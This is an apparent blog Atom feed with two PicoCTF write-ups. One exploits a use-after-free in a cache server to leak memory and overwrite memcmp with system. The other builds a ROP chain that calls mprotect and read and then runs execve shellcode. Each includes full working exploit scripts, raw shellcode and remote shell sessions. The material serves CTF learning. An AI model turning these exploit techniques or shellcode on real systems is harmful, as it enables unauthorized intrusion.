<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Exploit | staring into /dev/null]]></title>
  <link href="http://barrebas.github.io/blog/categories/exploit/atom.xml" rel="self"/>
  <link href="http://barrebas.github.io/"/>
  <updated>2015-01-12T19:02:13+01:00</updated>
  <id>http://barrebas.github.io/</id>
  <author>
    <name><![CDATA[barrebas]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[PicoCTF - Fancy Cache]]></title>
    <link href="http://barrebas.github.io/blog/2014/11/06/picoctf-fancy-cache/"/>
    <updated>2014-11-06T23:49:03+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/11/06/picoctf-fancy-cache</id>
    <content type="html"><![CDATA[<p>Fancy Cache was another &ldquo;Master Challenge&rdquo; for PicoCTF. It featured a custom server, which allegedly creates a cache of strings. It&rsquo;s up to us to break it!</p>

<!--more-->


<p>We are given the source code, the binary, a libc library and a client written in Python. Wow! <code>fancy_cache</code> communicates in a difficult way, but luckily, all the heavy lifting is already done for us in <code>client.py</code>! Browsing through fancy_cache.c, we immediately felt that this had to be some kind of use-after-free bug. Indeed, there is a bug in these two functions:</p>

<pre><code class="c">struct cache_entry *cache_lookup(struct string *key) {
  size_t i;
  for (i = 0; i &lt; kCacheSize; ++i) {
    struct cache_entry *entry = &amp;cache[i];

    // Skip expired cache entries.
    if (entry-&gt;lifetime == 0) {
      continue;
    }

    if (string_eq(entry-&gt;key, key)) {
       return entry;
    }
  }

  return NULL;
}

void do_cache_get(void) {
  struct string key;
  string_init(&amp;key);
  read_into_string(&amp;key);

  struct cache_entry *entry = cache_lookup(&amp;key);
  if (entry == NULL) {
    write(STDOUT_FILENO, &amp;kNotFound, sizeof(kNotFound));
    return;
  }

  write(STDOUT_FILENO, &amp;kFound, sizeof(kFound));
  write_string(entry-&gt;value);

  --entry-&gt;lifetime;
  if (entry-&gt;lifetime &lt;= 0) {
    // The cache entry is now expired.
    fprintf(stderr, "Destroying key %s\n", entry-&gt;key-&gt;data);
    string_destroy(entry-&gt;key);
    fprintf(stderr, "Destroying value %s\n", entry-&gt;value-&gt;data);
    string_destroy(entry-&gt;value);
  }
}
</code></pre>

<p>The function <code>do_cache_get</code> will free a string struct when the lifetime goes below zero, but <code>cache_lookup</code> will happily return entries with a negative lifetime. That means we can free a string struct, <em>somehow</em> write to it, and influence the cache entries! After calls to <code>free()</code>, subsequent calls to <code>malloc()</code> will usually return recently freed memory. For instance, consider this sequence:</p>

<pre><code class="bash"># start our server
bas@tritonal:~/tmp/picoctf/fancy_cache$ socat TCP-LISTEN:1337,reuseaddr,fork EXEC:./fancy_cache
</code></pre>

<p>And modify the client.py script a bit:</p>

<pre><code class="python"># Add an entry with a negative lifetime. This will fool cache_lookup.
cache_set(f, 'keyAAAA', 'AAAA____', 0xffffffff)

# Request that value, causing it to be deleted from cache
print cache_get(f, 'keyAAAA')

# Now request the value of 'bleh'
print cache_get(f, 'bleh')
</code></pre>

<p>This results in the following debug output of the local server:</p>

<pre><code class="bash">malloc(12) = 0x8598008 (string_create)
realloc((nil), 7) = 0x8598018 (read_into_string)
malloc(12) = 0x8598028 (string_create)
realloc((nil), 8) = 0x8598038 (read_into_string)
realloc((nil), 7) = 0x8598048 (read_into_string)
Destroying key
free(0x8598008) (string_destroy str)
Destroying value
free(0x8598028) (string_destroy str)
realloc((nil), 4) = 0x8598028 (read_into_string)
</code></pre>

<p>At first, the code allocates <code>0x8598008</code> and <code>0x8598028</code> as <code>key</code> and <code>value</code> string structs, respectively. Then, we request the value of &lsquo;keyAAAA&rsquo;, causing do_cache_get to free that memory again. Next, we request the value of the non-existent key &lsquo;bleh&rsquo;. However, the program allocates space at <code>0x8598028</code>, the recently freed region! Because the cache entry is still valid (lifetime != 0), we can write a new string struct to these locations! Let&rsquo;s first try to read memory. There is a hint hidden on the remote server, waiting for us. In the local copy, it just says <code>REDACTED</code>. In order for this work, cache->key->data must point to a real string. I choose &lsquo;printf&rsquo; in the binary. So:</p>

<ul>
<li>We register a struct string with lifetime -1.</li>
<li>We fetch it; the struct string will be freed, but the cache_lookup() function will still try to use it, because lifetime != 0</li>
<li>We try to request another string struct, but this will allocate the old memory location and overwrite the old alloc’ed key &amp; value regions (still valid according to cache_lookup()!).</li>
<li>We “write” a string struct into value:
<code>bash
old_value-&gt;length = 0xff
old_value-&gt;capacity = 0x00
old_value-&gt;data = pointer to whatever we want to read
</code></li>
<li>We write a string struct into key:</li>
</ul>


<pre><code class="bash">old_key-&gt;length = 0x6
old_key-&gt;cap = 0x00
old_key-&gt;data = pointer to string that is known, like printf -&gt;      0x8048310
</code></pre>

<p>We need that known string (printf was chosen arbitrarily) because we need the following piece of code to evaluate to true:</p>

<pre><code class="c">    if (string_eq(entry-&gt;key, key)) {
       return entry;
    }
</code></pre>

<ul>
<li>We request the key called &lsquo;printf&rsquo;; the cache_lookup will succeed, and it will give us the memory that is stored at old_value->data, which is supplied by us!</li>
</ul>


<pre><code class="python">### modifications to client.py:

# Add an entry to the cache
assert cache_set(f, 'keyAAAA', 'AAAA____', 0xffffffff)
# Delete from cache
print cache_get(f, 'keyAAAA')
# This is read into the old "value" struct (used to be 0x8, 0x0, *(AAAA____)). 
print cache_get(f, '\xff\x00\x00\x00\x00\x00\x00\x00\xc9\x8b\x04\x08')
# This is read into the old "key" struct (used to be 0x7, 0x0, *(keyAAAA))
# We supply the address of 'printf', so the check will pass &amp; we read whatever is at value-&gt;data
print cache_get(f, '\x06\x00\x00\x00\x06\x00\x00\x00\x10\x83\x04\x08')
# Print the actual data!
print cache_get(f, 'printf')
</code></pre>

<p>This gives the following output locally:</p>

<pre><code class="bash">bas@tritonal:~/tmp/picoctf/fancy_cache$ python client.py 
AAAA____
None
None
REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED RED
</code></pre>

<p>And for the remote server:</p>

<pre><code class="bash">bas@tritonal:~/tmp/picoctf/fancy_cache$ python client.py 

AAAA____
None
None
ongratulations! Looks like you figured out how to read memory. This can can be a useful tool for defeating ASLR :-) Head over to https://picoctf.com/problem-static/binary/fancy_cache/next_steps.html for some hints on how to go from what you have to a shel
</code></pre>

<p>Aha! Hints! Actually, that page spells out exactly what we need to do. I decided to follow it, also because of the very specific mention of the address of <code>memcmp</code>, which we need to defeat ASLR. Using the same read memory trick, we grab the address of <code>memcmp</code>, which is stored at <code>0x804b014</code>. Using this address, we can calculate system by subtracting 0x142870 and adding 0x40100, the address of system in the supplied libc.so.6. Then, we need to write that value to <code>0x804b014</code> by doing a cache_set call. Finally, we need to trigger <code>memcmp</code>, which now actually calls <code>system</code>. Oof! This turned out to be less-than-trivial, mostly because of differences in the address of memcmp on my local box. Finally, I worked out the following script (hopefully with enough comments to make sense of what&rsquo;s going on):</p>

<pre><code class="python">#!/usr/bin/python
import struct
import socket
import telnetlib

def pack4(v):
    """
    Takes a 32 bit integer and returns a 4 byte string representing the
    number in little endian.
    """
    assert 0 &lt;= v &lt;= 0xffffffff
    # The &lt; is for little endian, the I is for a 4 byte unsigned int.
    # See https://docs.python.org/2/library/struct.html for more info.
    return struct.pack('&lt;I', v)

def unpack4(v):
    """Does the opposite of pack4."""
    assert len(v) == 4
    return struct.unpack('&lt;I', v)[0]

CACHE_GET = 0
CACHE_SET = 1

kNotFound = 0x0
kFound = 0x1
kCacheFull = 0x2

def write_string(f, s):
    f.write(pack4(len(s)))
    f.write(s)

def read_string(f):
    size = unpack4(f.read(4))
    return f.read(size)

def cache_get(f, key):
    f.write(chr(CACHE_GET))
    write_string(f, key)

    status = ord(f.read(1))
    if status == kNotFound:
        return None
    assert status == kFound

    return read_string(f)

# We need this modified function, because once we hit system('/bin/sh'),
# there will be no more data sent back in the way that the original 
# function expects. This causes it to b0rk.
def cache_get2(f, key):
    f.write(chr(CACHE_GET))
    write_string(f, key)

def cache_set(f, key, value, lifetime):
    f.write(chr(CACHE_SET))
    write_string(f, key)

    status = ord(f.read(1))
    if status == kCacheFull:
        return False
    assert status == kFound

    write_string(f, value)
    f.write(pack4(lifetime))
    return True

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('vuln2014.picoctf.com', 4548))
f = s.makefile('rw', bufsize=0)

# Command to be executed later, once we've overwritten memcmp@plt.
cmd = '/bin/sh\x00'

# Add an entry to the cache; we will use this command later to spawn the shell. 
cache_set(f, cmd, "payload", 1000)

# Add an entry with a negative lifetime. This will fool cache_lookup, because it only checks for zero:
'''
    // Skip expired cache entries.
    if (entry-&gt;lifetime == 0) {
      continue;
    }
'''
cache_set(f, 'keyAAAA', 'AAAA____', 0xffffffff)

# Request that value, causing it to be deleted from cache
print cache_get(f, 'keyAAAA')

'''
// This is how the string struct looks like:
struct string {
  size_t length;
  size_t capacity;
  char *data;
};
'''
# Now, we request the value of a key called '\x04\x00\x00\x00\x00\x00\x00\..."
# but this is read into the old "value" struct (used to be 0x8, 0x0, *(AAAA____)),
# because malloc will re-use this address.
# Leak memcmp address @ 0x804b014
cache_get(f, pack4(4)+pack4(4)+pack4(0x804b014))

# This is read into the old "key" struct (used to be 0x7, 0x0, *(keyAAAA))
# We supply the address of 'printf', so the check will pass &amp; we read whatever is at value-&gt;data
cache_get(f, pack4(6)+pack4(6)+pack4(0x8048310))

# Grab memcmp address:
addr_memcmp = unpack4(cache_get(f, 'printf'))
print "[+] Leaking memcmp address: {}".format(hex(addr_memcmp))

# Calculate system address:
addr_system = addr_memcmp - 0x142870 + 0x40100 
print "[+] Calculated system address: {}".format(hex(addr_system))

# Now we have to overwrite memcmp @ 0x804b014. The hints say we can do this with cache_set. 
# We'd love to abuse our old cache entry again, but alas, the memory regions have again been 
# freed(), due to cache_get seeing a lifetime &lt;= 0.
# We'll restore them, so we can abuse them again to write to 0x804b014.

cache_get(f, pack4(4)+pack4(4)+pack4(0x804b014))
cache_get(f, pack4(6)+pack4(0)+pack4(0x8048310))

print "[+] Attempting to overwrite memcmp pointer..."
assert cache_set(f, 'printf', pack4(addr_system), 1)

print "[+] Running {} on remote box".format(cmd)
print cache_get2(f, cmd)

# Once you get the service to run a shell, this lets you send commands
# to the shell and get the results back :-)

t = telnetlib.Telnet()
t.sock = s
t.interact()
</code></pre>

<p>Running it lands us a shell!</p>

<pre><code class="bash">bas@tritonal:~/tmp/picoctf/fancy_cache$ python client.py 
AAAA____
[+] Leaking memcmp address: 0xf7686870
[+] Calculated system address: 0xf7584100
[+] Attempting to overwrite memcmp pointer...
[+] Running /bin/sh on remote box
None
id
uid=1009(fancy_cache) gid=1009(fancy_cache) groups=1009(fancy_cache)
ls /home/ 
bleichenbacher
easyoverflow
ecb
fancy_cache
guess
hardcore_owner
lowentropy
netsino
policerecords
ubuntu
ls /home/fancy_cache
fancy_cache
fancy_cache.sh
flag.txt
cat /home/fancy_cache/flag.txt
that_wasnt_so_free_after_all
</code></pre>

<p>The flag is <code>that_wasnt_so_free_after_all</code>. Fancy indeed!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PicoCTF - Hardcore ROP]]></title>
    <link href="http://barrebas.github.io/blog/2014/11/06/picoctf-hardcore-rop/"/>
    <updated>2014-11-06T23:48:56+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/11/06/picoctf-hardcore-rop</id>
    <content type="html"><![CDATA[<p>Our team, <a href="https://ctf-team.vulnhub.com">vulnhub-ctf</a>, joined <code>picoctf</code> to improve our skills and learn a thing or two. There were many challenges, among which a few &ldquo;Master Challenges&rdquo; worth 200 points. This is a story of how we tackled <code>hardcore_rop</code>. The challenge promises ASLR, NX, PIE and what-have-you, so let&rsquo;s get cracking!</p>

<!--more-->


<p>Upon inspecting the source of code of this weird program, we see the following:</p>

<pre><code class="c">void randop() {
    munmap((void*)0x0F000000, MAPLEN);
    void *buf = mmap((void*)0x0F000000, MAPLEN, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_FIXED, 0, 0);
    unsigned seed;
    if(read(0, &amp;seed, 4) != 4) return;
    srand(seed);
    for(int i = 0; i &lt; MAPLEN - 4; i+=3) {
        *(int *)&amp;((char*)buf)[i] = rand();
        if(i%66 == 0) ((char*)buf)[i] = 0xc3;
    }
    mprotect(buf, MAPLEN, PROT_READ|PROT_EXEC);
    puts("ROP time!");
    fflush(stdout);
    size_t x, count = 0;
    do x = read(0, ((char*)&amp;seed)+count, 555-count);
    while(x &gt; 0 &amp;&amp; (count += x) &lt; 555 &amp;&amp; ((char*)&amp;seed)[count-1] != '\n');
}

int main(int argc, char *argv[]) {
    struct stat st;
    if(argc != 2 || chdir(argv[1]) != 0 || stat("./flag", &amp;st) != 0) {
        puts("oops, problem set up wrong D:");
        fflush(stdout);
        return 1;
    } else {
        puts("yo, what's up?");
        alarm(30); sleep(1);
        randop();
        fflush(stdout);
        return 0;
    }
}
</code></pre>

<p>The <code>randop()</code> function is interesting, because it does two things. Firstly, this bit builds random ROP gadgets:</p>

<pre><code class="c">    munmap((void*)0x0F000000, MAPLEN);
    void *buf = mmap((void*)0x0F000000, MAPLEN, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_FIXED, 0, 0);
    unsigned seed;
    if(read(0, &amp;seed, 4) != 4) return;
    srand(seed);
    for(int i = 0; i &lt; MAPLEN - 4; i+=3) {
        *(int *)&amp;((char*)buf)[i] = rand();
        if(i%66 == 0) ((char*)buf)[i] = 0xc3;  
    }
    mprotect(buf, MAPLEN, PROT_READ|PROT_EXEC);
</code></pre>

<p>The memory region containing the random ROP gadgets is set to executable. However, we control the seed value, so we can &ldquo;choose&rdquo; which gadgets are generated. Secondly, this function causes a buffer overflow thanks to the following code:</p>

<pre><code class="c">    size_t x, count = 0;
    do x = read(0, ((char*)&amp;seed)+count, 555-count);
    while(x &gt; 0 &amp;&amp; (count += x) &lt; 555 &amp;&amp; ((char*)&amp;seed)[count-1] != '\n');
</code></pre>

<p>This function starts to overwrite the stack up to the point were the saved return address is. Very nice! First, let&rsquo;s enable coredumps and get control of EIP.</p>

<pre><code class="bash">bas@tritonal:~/tmp/picoctf/hardcorrop$ (echo 7777; python -c 'print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB"') | ./hardcore_rop `pwd`
yo, what's up?
ROP time!
Segmentation fault (core dumped)
bas@tritonal:~/tmp/picoctf/hardcorrop$ gdb hardcore_rop core
GNU gdb (GDB) 7.4.1-debian
...
Core was generated by `./hardcore_rop /home/bas/tmp/picoctf/hardcorrop'.
Program terminated with signal 11, Segmentation fault.
#0  0x42424242 in ?? ()
</code></pre>

<p>Excellent! After we send a seed value (7777), we supply a buffer that overwrites the saved return address on the stack. But we cannot just put our shellcode on the stack and execute it, because of NX. We can&rsquo;t write into the region at <code>0xf000000</code> because it isn&rsquo;t writeable. Furthermore, most of the address are randomized due to PIE and ALSR. Only the ROP gadgets at <code>0xf000000</code> are always at the same location. We need to find enough ROP gadgets to make the region at <code>0xf000000</code> writeable, so that we can store shellcode there and execute it.</p>

<p>For this to work, we need two things: control over registers and an <code>int 0x80</code> instruction, to execute syscalls. The region at <code>0xf000000</code> contains 40960 bytes, filled with random ROP gadgets. There could be an <code>int 0x80; ret;</code> in there. The chances are slim, but there&rsquo;s a chance nonetheless. I scripted the search for ROP gadgets with the following:</p>

<pre><code class="bash">#!/bin/bash

while read i; do
    (echo $i; echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB") | ./hardcore_rop `pwd`
    dd if=core of=region bs=1 skip=4096 count=40960
    xxd -c 1 region | awk {'print $1 $2'} |sort -r &gt; dump.txt
    python ./ropgadget.py -i bleh -d 10 &gt; $i-gadgets.txt

    cat $i-gadgets.txt |egrep 'int 0x80'
    rm core
    rm dump.txt
done &lt; digits.txt
</code></pre>

<p>This script does the following: it runs the program and sends a seed value for the ROP gadget generation. Then, it crashes the program. From the coredump, it extracts the region at <code>0xf000000</code> and proceeds to dump all these bytes into a textfile. Finally, my custom <a href="https://gist.github.com/barrebas/4fc86eaf0e9b124813a3">ropgadget.py</a> searcher extracts all the ROP gadgets. It is slightly modified to work with this setup. I let this script run for a few hours. After a while, I ran</p>

<pre><code class="bash">bas@tritonal:~/tmp/picoctf/hardcorrop$ grep "int 0x80" *
0347-gadgets.txt:RET: 0x0000d64: int 0x80; lahf; ret; 
</code></pre>

<p>It found an <code>int 0x80</code> gadget! Luckily, the opcode <code>lahf</code> is harmless: it just load the FLAGS into <code>ah</code>. No big deal! With this useable gadget, a ROP chain could be built that calls <code>mprotect</code> to set the region at <code>0xf000000</code> to writeable. After this stage 1, a second stage would read the shellcode. First things first, let&rsquo;s find gadgets that allow us to control registers. The easiest would be a <code>pop r32; ret</code>. Luckily, these sequences are very likely to occur. I found everything I needed in the list of gadgets:</p>

<pre><code># RET: 0x000913f: pop eax; ret;
# RET: 0x0003c7e: pop ecx; ret;
# RET: 0x0002393: pop edx; ret;
# RET: 0x000964d: pop ebx; ret;
# RET: 0x0000d64: int 0x80; lahf; ret;
</code></pre>

<p>I wrote the following ROP chain:</p>

<pre><code class="python">#!/usr/bin/python

import struct

BASE = 0xf000000
# RET: 0x000913f: pop eax; ret;
popeax = 0x000913f
# RET: 0x0003c7e: pop ecx; ret;
popecx = 0x0003c7e
# RET: 0x0002393: pop edx; ret;
popedx = 0x0002393
# RET: 0x000964d: pop ebx; ret;
popebx = 0x000964d
# RET: 0x0000569: pop edi; ret;
popedi = 0x0000569
# RET: 0x0000d64: int 0x80; lahf; ret;
int80h = 0x0000d64
# RET: 0x0001b11: int3; ret;
int03h = 0x0001b11

def p(x):
    return struct.pack("&lt;L", x)

payload = ""

# seed value
payload += "0347\n"

# overflow buffer
payload += "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

# syscall number 125 in eax (mprotect)
payload += p(BASE + popeax)
payload += p(125)

# pointer to memory region in ebx
payload += p(BASE + popebx)
payload += p(BASE)

# memory flags PROT_READ | PROT_WRITE | PROT_EXEC
payload += p(BASE + popedx)
payload += p(7)

# length in ecx, needs to be multiple of 2
payload += p(BASE + popecx)
payload += p(0x1000)

# call syscall int 0x80
payload += p(BASE + int80h)

# stage2 test
# edi = 0xf000000
payload += p(BASE + popedi)
payload += p(BASE)
# edx = 0xcccccccc (four times int 0x3)
payload += p(BASE + popedx)
payload += p(0xcccccccc)
# RET: 0x0002770: mov [edi], dh; ret
payload += p(BASE + 0x0002770)
# return to 0xf000000, which should contain an int 0x3
payload += p(BASE + popedx + 1)
payload += p(BASE)

print payload
## Usage: $ python ropsploit.py | ./hardcore_rop `pwd`
</code></pre>

<p>After running this first POC, the binary indeed crashed with a SIGTRAP error! Inspection of the core dump with <code>gdb</code> showed that the first byte of <code>0xf000000</code> was a <code>0xcc</code>, so this worked!</p>

<p>Writing the shellcode one byte at a time seemed tedious. Furthermore, the ROP chain has a maximum of 555 bytes, so a more flexible way was to use <code>syscall_read</code>. This will allow us to read in arbitrary shellcode. All the necessary gadgets were present:</p>

<pre><code class="python">#!/usr/bin/python

import time, struct

BASE = 0xf000000
popeax = 0x000913f
popecx = 0x0003c7e
popedx = 0x0002393
popebx = 0x000964d
popedi = 0x0000569
int80h = 0x0000d64
int03h = 0x0001b11

def p(x):
    return struct.pack("&lt;L", x)

payload = ""

# seed value
payload += "0347\n"

# overflow buffer
payload += "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

# eax = syscall_mprotect
payload += p(BASE + popeax)
payload += p(125)
# pointer to memory region in ebx
payload += p(BASE + popebx)
payload += p(BASE)
# memory flags PROT_READ | PROT_WRITE | PROT_EXEC
payload += p(BASE + popedx)
payload += p(7)
# length in ecx, needs to be multiple of 2
payload += p(BASE + popecx)
payload += p(0x1000)
# call syscall int 0x80
payload += p(BASE + int80h)

# eax = syscall_read
payload += p(BASE + popeax)
payload += p(3)
# ecx = ptr to BASE
payload += p(BASE + popecx)
payload += p(BASE)
# ebx = fd = stdin
payload += p(BASE + popebx)
payload += p(0)
# edx = size of shellcode (set to 100)
payload += p(BASE + popedx)
payload += p(100)
# call syscall int 0x80
payload += p(BASE + int80h)

# return to 0xf000000
payload += p(BASE + popedx + 1)
payload += p(BASE)

print payload
time.sleep(3)
</code></pre>

<p>Now, this was used with <a href="http://shell-storm.org/shellcode/files/shellcode-547.php">a slightly modified shellcode</a>. This shellcode uses <code>execve</code> to run <code>/bin/ash</code>; I changed it to run <code>/bin//sh</code>. The shellcode has to be supplied seperately on the command line; I could not get the exploit to work if the shellcode was printed from <code>ropsploit.py</code>. The following landed us a shell on the remote server (again, using <code>cat</code> to keep the shell alive):</p>

<pre><code class="bash">bas@tritonal:~/tmp/picoctf/hardcorrop$ (python ropsploit.py; python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'; cat) | nc vuln2014.picoctf.com 4000
yo, what's up?
ROP time!
ls -al
total 24
drwxr-xr-x    2 root     root          4096 Oct 28 17:55 .
drwxr-xr-x    3 root     root          4096 Oct  5 17:33 ..
-rw-r--r--    1 root     root            21 Oct  5 17:44 flag
-rwxr-xr-x    1 root     root         11266 Oct  6 01:13 hardcore_rop
cat flag
hard_as_PIE_amirite?
</code></pre>

<p>And there&rsquo;s the flag! A very fun challenge!</p>
]]></content>
  </entry>
  
</feed>
